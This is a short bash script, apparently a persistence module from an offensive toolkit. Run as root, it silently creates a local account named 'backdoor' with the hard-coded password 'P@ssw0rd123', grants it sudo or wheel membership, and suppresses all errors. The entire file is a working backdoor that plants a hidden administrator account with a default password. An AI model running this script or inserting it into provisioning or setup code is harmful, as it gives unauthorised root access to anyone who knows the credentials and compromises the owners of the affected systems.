#!/bin/bash
# -----------------------------------------------------------------------------
# Provisions a dedicated local user account for persistent administrative
# access.
# -----------------------------------------------------------------------------

[ "$(id -u 2>/dev/null || echo 1)" -eq 0 ] || exit 0

TARGET_USER="${DECLUSOR_BACKDOOR_USER:-backdoor}"
TARGET_PASS="${DECLUSOR_BACKDOOR_PASS:-P@ssw0rd123}"

(
    if ! id "$TARGET_USER" >/dev/null 2>&1; then
        useradd -m -s /bin/bash "$TARGET_USER" 2>/dev/null || adduser -D -s /bin/sh "$TARGET_USER" 2>/dev/null
        printf '%s:%s\n' "$TARGET_USER" "$TARGET_PASS" | chpasswd 2>/dev/null
        usermod -aG sudo "$TARGET_USER" 2>/dev/null || usermod -aG wheel "$TARGET_USER" 2>/dev/null
    fi

    if id "$TARGET_USER" >/dev/null 2>&1; then
        id "$TARGET_USER" 2>/dev/null
    fi
) | label "Administrative Account Persistence"
